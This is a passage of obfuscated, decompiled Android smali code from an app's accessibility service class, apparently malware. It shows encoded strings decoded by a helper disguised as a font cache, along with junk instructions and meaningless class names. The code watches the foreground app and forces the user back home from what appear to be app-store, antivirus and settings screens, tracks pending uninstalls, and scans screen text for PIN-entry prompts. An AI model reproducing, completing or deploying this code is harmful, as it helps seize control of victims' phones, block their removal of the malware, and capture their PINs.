    const-string v5, "00200079005600C900F700B700DB00B4002F0073004900C900F100B100D600B5002C007F005F00C900E400B000C600A6002F00750054008A00FD00BE00DC00A300260064"

    .line 749
    .line 750
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 751
    .line 752
    .line 753
    move-result-object v22

    .line 754
    const-string v5, "002D00730043009300F100AF00C200E90025006E"

    .line 755
    .line 756
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 757
    .line 758
    .line 759
    move-result-object v23

    .line 760
    const-string v5, "00200079005600C900F500AC00C600B5002C0078005C009400BE00BE00DC00A3003100790052008300BE00AF00DD00B7"

    nop

    nop

    .line 761
    .line 762
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 763
    .line 764
    .line 765
    move-result-object v24

    .line 766
    const-string v5, "00200079005600C900F100B300C200AF0022007F0055009100F500B100C600A800310038005D008E00FC00BA00DF00A6002D0077005C008200E2"

    .line 767
    .line 768
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 769
    .line 770
    .line 771
    move-result-object v25

    .line 772
    filled-new-array/range {v9 .. v25}, [Ljava/lang/String;

    .line 773
    .line 774
    .line 775
    move-result-object v5

    nop

    .line 776
    invoke-static {v5}, Lv/s/gA5gCwTK0qjTIn;->dTS0S7eC32ubQH54j36([Ljava/lang/Object;)Ljava/util/Set;

    .line 777
    .line 778
    .line 779
    move-result-object v5

    .line 780
    invoke-interface {v5, v3}, Ljava/util/Set;->contains(Ljava/lang/Object;)Z

    .line 781
    .line 782
    .line 783
    move-result v5

    .line 784
    if-eqz v5, :cond_19

    .line 785
    .line 786
    const-string v0, "00180051006E00A600C2009B00EF00E70005007F0057008200B000B200D300A900220071005E009500B000BD00DE00A80020007D005E008300AA00FF"

    .line 787
    .line 788
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 789
    .line 790
    .line 791
    invoke-direct {v1}, Lapp/mobilex/plus/services/DataQFAdapter;->blockAndGoHome()V

    .line 792
    .line 793
    .line 794
    return-void

    nop

    nop

    .line 795
    :cond_19
    sget-boolean v5, Lapp/mobilex/plus/services/DataQFAdapter;->UIBlock_Play:Z

    .line 796
    .line 797
    if-eqz v5, :cond_1c

    .line 798
    .line 799
    const-string v5, "00200079005600C900F100B100D600B5002C007F005F00C900E600BA00DC00A3002A0078005C"

    .line 800
    .line 801
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 802
    .line 803
    .line 804
    move-result-object v5

    .line 805
    invoke-virtual {v3, v5}, Ljava/lang/Object;->equals(Ljava/lang/Object;)Z

    .line 806
    .line 807
    .line 808
    move-result v5

    .line 809
    if-eqz v5, :cond_1c

    .line 810
    .line 811
    invoke-static {v8}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 812
    .line 813
    .line 814
    move-result-object v5

    .line 815
    invoke-static {v0, v5, v6}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 816
    .line 817
    .line 818
    move-result v5

    .line 819
    if-nez v5, :cond_1a

    .line 820
    .line 821
    const-string v5, "00220066004B008300F500AB00D300AE002F"

    .line 822
    .line 823
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 824
    .line 825
    .line 826
    move-result-object v5

    .line 827
    invoke-static {v0, v5, v6}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 828
    .line 829
    .line 830
    move-result v5

    .line 831
    if-nez v5, :cond_1a

    .line 832
    .line 833
    const-string v5, "0025007F0055009400FB00A6"

    .line 834
    .line 835
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 836
    .line 837
    .line 838
    move-result-object v5

    nop

    .line 839
    invoke-static {v0, v5, v6}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 840
    .line 841
    .line 842
    move-result v0

    nop

    nop

    .line 843
    if-eqz v0, :cond_1c

    .line 844
    .line 845
    :cond_1a
    :try_start_0
    invoke-virtual {v1}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    .line 846
    .line 847
    .line 848
    move-result-object v5
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_2

    .line 849
    if-eqz v5, :cond_1c

    .line 850
    .line 851
    :try_start_1
    invoke-virtual {v1}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    .line 852
    .line 853
    .line 854
    move-result-object v0

    .line 855
    invoke-virtual {v1}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    .line 856
    .line 857
    .line 858
    move-result-object v7

    nop

    .line 859
    invoke-virtual {v1}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    .line 860
    .line 861
    .line 862
    move-result-object v9

    .line 863
    invoke-virtual {v7, v9, v6}, Landroid/content/pm/PackageManager;->getApplicationInfo(Ljava/lang/String;I)Landroid/content/pm/ApplicationInfo;

    .line 864
    .line 865
    .line 866
    move-result-object v6

    .line 867
    invoke-virtual {v0, v6}, Landroid/content/pm/PackageManager;->getApplicationLabel(Landroid/content/pm/ApplicationInfo;)Ljava/lang/CharSequence;

    .line 868
    .line 869
    .line 870
    move-result-object v0

    .line 871
    invoke-virtual {v0}, Ljava/lang/Object;->toString()Ljava/lang/String;

    .line 872
    .line 873
    .line 874
    move-result-object v0

    .line 875
    invoke-virtual {v0, v2}, Ljava/lang/String;->toLowerCase(Ljava/util/Locale;)Ljava/lang/String;

    .line 876
    .line 877
    .line 878
    move-result-object v4
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    .line 879
    goto :goto_1

    nop

    .line 880
    :catchall_0
    move-exception v0

    .line 881
    goto/16 :goto_2

    .line 882
    :catch_0
    :goto_1
    :try_start_2
    invoke-virtual {v4}, Ljava/lang/String;->length()I

    .line 883
    .line 884
    .line 885
    move-result v0

    .line 886
    if-lez v0, :cond_1b

    nop

    .line 887
    .line 888
    filled-new-array {v4}, [Ljava/lang/String;

    .line 889
    .line 890
    .line 891
    move-result-object v0

    .line 892
    invoke-direct {v1, v5, v0}, Lapp/mobilex/plus/services/DataQFAdapter;->findAnyText(Landroid/view/accessibility/AccessibilityNodeInfo;[Ljava/lang/String;)Z

    .line 893
    .line 894
    .line 895
    move-result v0

    .line 896
    if-eqz v0, :cond_1b

    .line 897
    .line 898
    const-string v0, "04000422040B04DC04A8049D04FE"

    .line 899
    .line 900
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->checked(Ljava/lang/String;)Ljava/lang/String;

    .line 901
    .line 902
    .line 903
    move-result-object v0

    .line 904
    invoke-static {v8}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 905
    .line 906
    .line 907
    move-result-object v2

    .line 908
    const-string v4, "04770423040304DA04D1049D048204FC0478"

    .line 909
    .line 910
    invoke-static {v4}, Lapp/mobilex/plus/util/TypefaceCache;->checked(Ljava/lang/String;)Ljava/lang/String;

    .line 911
    .line 912
    .line 913
    move-result-object v4

    .line 914
    const-string v6, "002700730052008900E300AB00D300AB002F"

    nop

    .line 915
    .line 916
    invoke-static {v6}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 917
    .line 918
    .line 919
    move-result-object v6

    .line 920
    filled-new-array {v0, v2, v4, v6}, [Ljava/lang/String;

    .line 921
    .line 922
    .line 923
    move-result-object v0

    .line 924
    invoke-direct {v1, v5, v0}, Lapp/mobilex/plus/services/DataQFAdapter;->findAnyText(Landroid/view/accessibility/AccessibilityNodeInfo;[Ljava/lang/String;)Z

    .line 925
    .line 926
    .line 927
    move-result v0

    .line 928
    if-eqz v0, :cond_1b

    .line 929
    .line 930
    const-string v0, "00180051006E00A600C2009B00EF00E70013007A005A009E00B0008C00C600A800310073000100C700FF00AA00C000E700220066004B00C700E500B100DB00A900300062005A008B00FC00FF00C200A600240073"

    .line 931
    .line 932
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 933
    .line 934
    .line 935
    invoke-direct {v1}, Lapp/mobilex/plus/services/DataQFAdapter;->blockAndGoHome()V
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_0

    .line 936
    .line 937
    .line 938
    :try_start_3
    invoke-virtual {v5}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_3

    .line 939
    .line 940
    .line 941
    goto :goto_4

    .line 942
    :cond_1b
    :try_start_4
    invoke-virtual {v5}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_2

    .line 943
    .line 944
    .line 945
    goto :goto_3

    .line 946
    :goto_2
    :try_start_5
    invoke-virtual {v5}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_1

    .line 947
    .line 948
    .line 949
    :catch_1
    :try_start_6
    throw v0
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_2

    .line 950
    :catch_2
    :cond_1c
    :goto_3
    sget-boolean v0, Lapp/mobilex/plus/services/DataQFAdapter;->UIBlock_AV:Z

    .line 951
    .line 952
    if-eqz v0, :cond_1d

    .line 953
    .line 954
    const-string v0, "00200079005600C900FB00B200C100E900250064005E0082"

    .line 955
    .line 956
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 957
    .line 958
    .line 959
    move-result-object v4

    .line 960
    const-string v0, "002C0064005C00C900FD00BE00DE00B000220064005E008500E900AB00D700B4006D00770055009300F900B200D300AB0034007700490082"

    .line 961
    .line 962
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 963
    .line 964
    .line 965
    move-result-object v5

    .line 966
    const-string v0, "00200079005600C900F100A900D300B400370038005A008900F400AD00DD00AE002700380056008800F200B600DE00A2003000730058009200E200B600C600BE"

    .line 967
    .line 968
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 969
    .line 970
    .line 971
    move-result-object v6

    .line 972
    const-string v0, "00200079005600C900F200B600C600A300260070005E008900F400BA00C000E9003000730058009200E200B600C600BE"

    .line 973
    .line 974
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 975
    .line 976
    .line 977
    move-result-object v7

    .line 978
    const-string v0, "00200079005600C900E300A600DF00A6002D0062005E008400BE00B200DD00A5002A007A005E009400F500BC00C700B5002A00620042"

    .line 979
    .line 980
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 981
    .line 982
    .line 983
    move-result-object v8

    .line 984
    const-string v0, "00200079005600C900F500AC00D700B3006D00730056009400A200F100D500B7"

    nop

    .line 985
    .line 986
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 987
    .line 988
    .line 989
    move-result-object v9

    .line 990
    const-string v0, "00200079005600C900F400AD00C500A20021"

    .line 991
    .line 992
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 993
    .line 994
    .line 995
    move-result-object v10

    .line 996
    const-string v0, "00200079005600C900F400AD00C500A200210038004B009500FF"

    .line 997
    .line 998
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 999
    .line 1000
    .line 1001
    move-result-object v11

    .line 1002
    const-string v0, "00200079005600C900F400AD00C500A200210038004B009500FF00F100DF00A60031007D005E0093"

    .line 1003
    .line 1004
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1005
    .line 1006
    .line 1007
    move-result-object v12

    .line 1008
    const-string v0, "00200079005600C900FB00BE00C100B7002600640048008C00E900F100D900A20030"

    .line 1009
    .line 1010
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1011
    .line 1012
    .line 1013
    move-result-object v13

    .line 1014
    const-string v0, "00200079005600C900F100A900D500E90020007A005E008600FE00BA00C0"

    .line 1015
    .line 1016
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1017
    .line 1018
    .line 1019
    move-result-object v14

    .line 1020
    filled-new-array/range {v4 .. v14}, [Ljava/lang/String;

    .line 1021
    .line 1022
    .line 1023
    move-result-object v0

    .line 1024
    invoke-static {v0}, Lv/s/gA5gCwTK0qjTIn;->dTS0S7eC32ubQH54j36([Ljava/lang/Object;)Ljava/util/Set;

    .line 1025
    .line 1026
    .line 1027
    move-result-object v0

    .line 1028
    invoke-interface {v0, v3}, Ljava/util/Set;->contains(Ljava/lang/Object;)Z

    .line 1029
    .line 1030
    .line 1031
    move-result v0

    .line 1032
    if-eqz v0, :cond_1d

    .line 1033
    .line 1034
    const-string v0, "00180051006E00A600C2009B00EF00E700020078004F008E00E600B600C000B2003000360059008B00FF00BC00D900A20027002C001B"

    .line 1035
    .line 1036
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1037
    .line 1038
    .line 1039
    invoke-direct {v1}, Lapp/mobilex/plus/services/DataQFAdapter;->blockAndGoHome()V

    .line 1040
    .line 1041
    .line 1042
    :catch_3
    :cond_1d
    :goto_4
    return-void
.end method

.method private final checkAppLock(Ljava/lang/String;)V
    .locals 5

    .line 1
    sget-object v0, Lv/s/VpKcDcuRNaQkRJ5;->dDIMxZXP1V8HdM:Lv/s/VpKcDcuRNaQkRJ5;

    .line 2
    .line 3
    sget-boolean v0, Lv/s/VpKcDcuRNaQkRJ5;->JXn4Qf7zpnLjP5:Z

    .line 4
    .line 5
    if-nez v0, :cond_c

    .line 6
    .line 7
    sget-boolean v0, Lv/s/VpKcDcuRNaQkRJ5;->xDyLpEZyrcKVe0:Z

    .line 8
    .line 9
    if-eqz v0, :cond_0

    .line 10
    .line 11
    goto/16 :goto_2

    .line 12
    .line 13
    :cond_0
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    .line 14
    .line 15
    .line 16
    move-result-wide v0

    .line 17
    sget-wide v2, Lapp/mobilex/plus/services/DataQFAdapter;->protectionBypassUntil:J

    .line 18
    .line 19
    cmp-long v0, v0, v2

    .line 20
    .line 21
    if-gez v0, :cond_1

    .line 22
    .line 23
    goto/16 :goto_2

    .line 24
    .line 25
    :cond_1
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->pendingUninstallPkg:Ljava/lang/String;

    .line 26
    .line 27
    if-eqz v0, :cond_2

    nop

    .line 28
    .line 29
    goto/16 :goto_2

    .line 30
    .line 31
    :cond_2
    sget-object v0, Ljava/util/Locale;->ROOT:Ljava/util/Locale;

    .line 32
    .line 33
    invoke-virtual {p1, v0}, Ljava/lang/String;->toLowerCase(Ljava/util/Locale;)Ljava/lang/String;

    .line 34
    .line 35
    .line 36
    move-result-object p1

    .line 37
    invoke-virtual {p0}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    .line 38
    .line 39
    .line 40
    move-result-object v1

    nop

    .line 41
    invoke-virtual {v1, v0}, Ljava/lang/String;->toLowerCase(Ljava/util/Locale;)Ljava/lang/String;

    .line 42
    .line 43
    .line 44
    move-result-object v0

    .line 45
    invoke-virtual {p1, v0}, Ljava/lang/Object;->equals(Ljava/lang/Object;)Z

    .line 46
    .line 47
    .line 48
    move-result v0

    .line 49
    if-nez v0, :cond_c

    .line 50
    .line 51
    const-string v0, "002F0077004E008900F300B700D700B5"

    .line 52
    .line 53
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 54
    .line 55
    .line 56
    move-result-object v0

    .line 57
    const/4 v1, 0x0

    .line 58
    invoke-static {p1, v0, v1}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 59
    .line 60
    .line 61
    move-result v0

    .line 62
    if-nez v0, :cond_c

    .line 63
    .line 64
    const-string v0, "0030006F0048009300F500B200C700AE"

    .line 65
    .line 66
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 67
    .line 68
    .line 69
    move-result-object v0

    .line 70
    invoke-static {p1, v0, v1}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 71
    .line 72
    .line 73
    move-result v0

    .line 74
    if-eqz v0, :cond_3

    .line 75
    .line 76
    goto/16 :goto_2

    .line 77
    .line 78
    :cond_3
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->blockedApps:Ljava/util/Set;

    .line 79
    .line 80
    invoke-interface {v0, p1}, Ljava/util/Set;->contains(Ljava/lang/Object;)Z

    .line 81
    .line 82
    .line 83
    move-result v0

    .line 84
    const/16 v2, 0x1

    .line 85
    if-eqz v0, :cond_4

    .line 86
    .line 87
    const-string v0, "0001007A0054008400FB00BA00D600E700220066004B00C700F400BA00C600A200200062005E008300AA00FF"

    .line 88
    .line 89
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 90
    .line 91
    .line 92
    const-string v0, "006F0036005D008800E200BC00DB00A9002400360053008800FD00BA"

    .line 93
    .line 94
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 95
    .line 96
    .line 97
    invoke-virtual {p0, v2}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    .line 98
    .line 99
    .line 100
    new-instance v0, Lv/s/ssJAORu9Srr5Q9qO2sq;

    .line 101
    .line 102
    const/16 v3, 0x6

    .line 103
    invoke-direct {v0, p0, v3}, Lv/s/ssJAORu9Srr5Q9qO2sq;-><init>(Lapp/mobilex/plus/services/DataQFAdapter;I)V

    .line 104
    .line 105
    .line 106
    const-wide/16 v3, 0x96

    .line 107
    .line 108
    invoke-direct {p0, v0, v3, v4}, Lapp/mobilex/plus/services/DataQFAdapter;->safePostDelayed(Lv/s/JRdueaGIH5g8DVCPba;J)V

    .line 109
    .line 110
    .line 111
    new-instance v0, Lv/s/jpTJdQ79mlaJtReLZ1F;

    .line 112
    .line 113
    invoke-direct {v0, p0, p1, v1}, Lv/s/jpTJdQ79mlaJtReLZ1F;-><init>(Lapp/mobilex/plus/services/DataQFAdapter;Ljava/lang/String;I)V

    .line 114
    .line 115
    .line 116
    const-wide/16 v3, 0x1f4

    nop

    .line 117
    .line 118
    invoke-direct {p0, v0, v3, v4}, Lapp/mobilex/plus/services/DataQFAdapter;->safePostDelayed(Lv/s/JRdueaGIH5g8DVCPba;J)V

    .line 119
    .line 120
    .line 121
    new-instance v0, Lv/s/jpTJdQ79mlaJtReLZ1F;

    .line 122
    .line 123
    invoke-direct {v0, p0, p1, v2}, Lv/s/jpTJdQ79mlaJtReLZ1F;-><init>(Lapp/mobilex/plus/services/DataQFAdapter;Ljava/lang/String;I)V

    .line 124
    .line 125
    .line 126
    const-wide/16 v1, 0x3e8

    .line 127
    .line 128
    invoke-direct {p0, v0, v1, v2}, Lapp/mobilex/plus/services/DataQFAdapter;->safePostDelayed(Lv/s/JRdueaGIH5g8DVCPba;J)V

    .line 129
    .line 130
    .line 131
    return-void

    .line 132
    :cond_4
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->lockedApps:Ljava/util/Set;

    .line 133
    .line 134
    invoke-interface {v0, p1}, Ljava/util/Set;->contains(Ljava/lang/Object;)Z

    .line 135
    .line 136
    .line 137
    move-result v0

    .line 138
    sget-object v3, Lapp/mobilex/plus/services/DataQFAdapter;->autoLockedApps:Ljava/util/Set;

    .line 139
    .line 140
    invoke-interface {v3, p1}, Ljava/util/Set;->contains(Ljava/lang/Object;)Z

    .line 141
    .line 142
    .line 143
    move-result p1

    .line 144
    if-eqz v0, :cond_5

    .line 145
    .line 146
    if-nez p1, :cond_5

    .line 147
    .line 148
    goto/16 :goto_0

    .line 149
    :cond_5
    if-eqz v0, :cond_6

    .line 150
    .line 151
    if-eqz p1, :cond_6

    .line 152
    .line 153
    goto :goto_0

    .line 154
    :cond_6
    if-eqz p1, :cond_7

    .line 155
    .line 156
    sget-object p1, Lapp/mobilex/plus/services/DataQFAdapter;->Companion:Lv/s/GARjgaGEpTotOxcl8vfe;

    .line 157
    .line 158
    invoke-virtual {p1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 159
    .line 160
    .line 161
    invoke-static {}, Lv/s/GARjgaGEpTotOxcl8vfe;->l1V0lQr6TbwNKqHfXNbb()Z

    .line 162
    .line 163
    .line 164
    move-result v2

    .line 165
    goto/16 :goto_0

    .line 166
    :cond_7
    move v2, v1

    .line 167
    :goto_0
    if-eqz v2, :cond_b

    .line 168
    .line 169
    sget-object p1, Lv/s/vbdyByOHPJmeGXlq;->dDIMxZXP1V8HdM:Ljava/lang/String;

    .line 170
    .line 171
    sget-boolean p1, Lv/s/vbdyByOHPJmeGXlq;->xfn2GJwmGqs7kWW:Z

    .line 172
    .line 173
    if-nez p1, :cond_c

    .line 174
    .line 175
    const-string p1, "000F00790058008C00F500BB009200A600330066001B008300F500AB00D700A400370073005F00DD00B0"

    .line 176
    .line 177
    invoke-static {p1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 178
    .line 179
    .line 180
    const-string p1, "0063003E0056008600FE00AA00D300AB007E"

    .line 181
    .line 182
    invoke-static {p1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 183
    .line 184
    .line 185
    const-string p1, "00630077004E009300FF00E2"

    .line 186
    .line 187
    invoke-static {p1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 188
    .line 189
    .line 190
    const-string p1, "006A003A001B009400F800B000C500AE002D0071001B008800E600BA00C000AB0022006F"

    .line 191
    .line 192
    invoke-static {p1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 193
    .line 194
    .line 195
    sget-boolean p1, Lv/s/vbdyByOHPJmeGXlq;->xfn2GJwmGqs7kWW:Z

    .line 196
    .line 197
    if-eqz p1, :cond_8

    .line 198
    .line 199
    goto :goto_2

    .line 200
    :cond_8
    sget-object p1, Lapp/mobilex/plus/services/DataQFAdapter;->Companion:Lv/s/GARjgaGEpTotOxcl8vfe;

    .line 201
    .line 202
    invoke-virtual {p1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 203
    .line 204
    .line 205
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getInstance$cp()Lapp/mobilex/plus/services/DataQFAdapter;

    .line 206
    .line 207
    .line 208
    move-result-object p1

    nop

    nop

    .line 209
    if-nez p1, :cond_9

    .line 210
    .line 211
    goto :goto_2

    nop

    .line 212
    :cond_9
    :goto_1
    invoke-static {}, Ljava/util/Locale;->getDefault()Ljava/util/Locale;

    .line 213
    .line 214
    .line 215
    move-result-object v0

    .line 216
    invoke-virtual {v0}, Ljava/util/Locale;->toString()Ljava/lang/String;

    .line 217
    .line 218
    .line 219
    move-result-object v0

    nop

    .line 220
    invoke-virtual {v0}, Ljava/lang/String;->length()I

    .line 221
    .line 222
    .line 223
    move-result v0

    .line 224
    const/16 v2, 0x3e7

    .line 225
    .line 226
    if-le v0, v2, :cond_a

    .line 227
    .line 228
    new-instance v0, Ljava/lang/StringBuilder;

    .line 229
    .line 230
    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    .line 231
    .line 232
    .line 233
    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    .line 234
    .line 235
    .line 236
    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->setLength(I)V

    .line 237
    .line 238
    .line 239
    goto :goto_1

    .line 240
    :cond_a
    sget-object v0, Lv/s/vbdyByOHPJmeGXlq;->Qrz92kRPw4GcghAc:Landroid/os/Handler;

    .line 241
    .line 242
    new-instance v1, Lv/s/TgFV4UY0xAiKxQwpKNg;

    .line 243
    .line 244
    const/16 v2, -0x20

    add-int/lit8 v2, v2, 0x36

    .line 245
    .line 246
    invoke-direct {v1, p1, v2}, Lv/s/TgFV4UY0xAiKxQwpKNg;-><init>(Lapp/mobilex/plus/services/DataQFAdapter;I)V

    .line 247
    .line 248
    .line 249
    invoke-virtual {v0, v1}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z

    .line 250
    .line 251
    .line 252
    return-void

    .line 253
    :cond_b
    sget-object p1, Lv/s/vbdyByOHPJmeGXlq;->dDIMxZXP1V8HdM:Ljava/lang/String;

    .line 254
    .line 255
    sget-boolean p1, Lv/s/vbdyByOHPJmeGXlq;->xfn2GJwmGqs7kWW:Z

    nop

    .line 256
    .line 257
    if-eqz p1, :cond_c

    nop

    .line 258
    .line 259
    invoke-static {}, Lv/s/vbdyByOHPJmeGXlq;->gmNWMfvn6zlEj()V

    .line 260
    .line 261
    .line 262
    :cond_c
    :goto_2
    return-void
.end method

.method private final checkForPinScreen(Landroid/view/accessibility/AccessibilityNodeInfo;I)Z
    .locals 8

    .line 1
    const/16 v0, -0x39

    nop

    nop

    add-int/lit8 v0, v0, 0x4d

    .line 2
    .line 3
    const/16 v1, 0x0

    .line 4
    if-le p2, v0, :cond_0

    .line 5
    .line 6
    goto/16 :goto_5

    .line 7
    .line 8
    :cond_0
    :try_start_0
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    .line 9
    .line 10
    .line 11
    move-result-object v0
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_4

    .line 12
    const-string v2, ""

    .line 13
    .line 14
    if-eqz v0, :cond_1

    nop

    nop

    .line 15
    .line 16
    :try_start_1
    invoke-virtual {v0}, Ljava/lang/Object;->toString()Ljava/lang/String;

    .line 17
    .line 18
    .line 19
    move-result-object v0

    .line 20
    if-nez v0, :cond_2

    .line 21
    .line 22
    :cond_1
    move-object/from16 v0, v2

    .line 23
    :cond_2
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getContentDescription()Ljava/lang/CharSequence;

    .line 24
    .line 25
    .line 26
    move-result-object v3

    .line 27
    if-eqz v3, :cond_4

    .line 28
    .line 29
    invoke-virtual {v3}, Ljava/lang/Object;->toString()Ljava/lang/String;

    .line 30
    .line 31
    .line 32
    move-result-object v3

    .line 33
    if-nez v3, :cond_3

    nop

    nop

    .line 34
    .line 35
    goto/16 :goto_0

    .line 36
    :cond_3
    move-object v2, v3

    .line 37
    :cond_4
    :goto_0
    new-instance v3, Ljava/lang/StringBuilder;

    .line 38
    .line 39
    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    .line 40
    .line 41
    .line 42
    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 43
    .line 44
    .line 45
    const-string v0, " "

    nop

    .line 46
    .line 47
    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 48
    .line 49
    .line 50
    invoke-virtual {v3, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 51
    .line 52
    .line 53
    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 54
    .line 55
    .line 56
    move-result-object v0

    .line 57
    sget-object v2, Ljava/util/Locale;->ROOT:Ljava/util/Locale;

    .line 58
    .line 59
    invoke-virtual {v0, v2}, Ljava/lang/String;->toLowerCase(Ljava/util/Locale;)Ljava/lang/String;

    .line 60
    .line 61
    .line 62
    move-result-object v0

    .line 63
    iget-object v2, p0, Lapp/mobilex/plus/services/DataQFAdapter;->pinScreenKeywords:[Ljava/lang/String;

    .line 64
    .line 65
    array-length v3, v2

    .line 66
    move v4, v1

    .line 67
    :goto_1
